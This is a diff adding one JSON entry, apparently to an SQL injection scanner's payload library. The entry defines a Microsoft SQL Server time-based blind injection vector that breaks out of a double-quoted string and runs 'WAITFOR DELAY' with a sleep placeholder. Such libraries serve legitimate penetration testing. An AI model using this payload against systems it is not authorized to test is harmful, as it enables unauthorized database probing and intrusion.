@@ -1,0 +1,12 @@
+{
+ "dbms": "mssql",
+ "technique": "time",
+ "boundary": {
+  "prefix": "\"",
+  "suffix": "",
+  "type": "double-quote",
+  "desc": "double-quoted string"
+ },
+ "vector": "{B}; WAITFOR DELAY '0:0:{SLEEP}'-- -",
+ "comment": "mssql time via double-quoted string"
+}
